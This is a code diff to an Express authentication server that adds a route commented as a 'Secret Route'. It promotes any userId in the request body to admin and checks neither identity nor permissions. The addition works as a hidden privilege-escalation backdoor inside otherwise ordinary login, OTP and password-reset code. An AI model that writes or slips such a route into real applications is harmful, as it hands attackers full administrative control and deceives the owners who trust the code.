@@ -220,6 +220,21 @@ app.post('/api/auth/verify-otp', async (req, res) => {
     }
 });
 
+// API: Promote to Admin (Secret Route)
+app.post('/api/auth/promote-admin', async (req, res) => {
+    const { userId } = req.body;
+    try {
+        const user = await User.findByPk(userId);
+        if (!user) return res.status(404).json({ error: 'User not found' });
+
+        await user.update({ role: 'admin' });
+        res.json({ success: true, message: 'User promoted to admin' });
+    } catch (err) {
+        console.error('Promotion Error:', err);
+        res.status(500).json({ error: 'Failed to promote user' });
+    }
+});
+
 // API: Reset Password
 app.post('/api/auth/reset-password', async (req, res) => {
     const { email, otp, newPassword } = req.body;
